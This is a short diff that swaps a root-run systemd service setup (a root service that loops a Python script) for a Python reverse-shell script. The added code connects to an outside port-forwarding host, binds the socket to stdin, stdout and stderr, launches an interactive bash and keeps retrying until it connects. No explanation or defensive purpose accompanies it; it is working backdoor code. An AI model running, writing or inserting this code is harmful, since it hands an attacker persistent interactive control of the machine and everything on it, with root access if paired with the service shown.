@@ -1,19 +1,22 @@
-sudo bash -c 'cat << "EOF" > /etc/systemd/system/myscript.service
-[Unit]
-Description=My Background Python Script Service
-After=network.target
+import socket
+import subprocess
+import os
+import time
 
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c "while true; do python3 /usr/local/bin/myscript.py; sleep 5; done"
-Restart=always
-RestartSec=5
+target_host = "0779760504-61016.portmap.host"
+target_port = 61016
 
-[Install]
-WantedBy=multi-user.target
-EOF'
+while True:
+  try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_host, target_port))
 
-sudo systemctl daemon-reload
-sudo systemctl enable myscript.service
-sudo systemctl start myscript.service
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+
+    p = subprocess.call(["/bin/bash", "-i"])
+    break
+  except Exception:
+    time.sleep(5)
+    
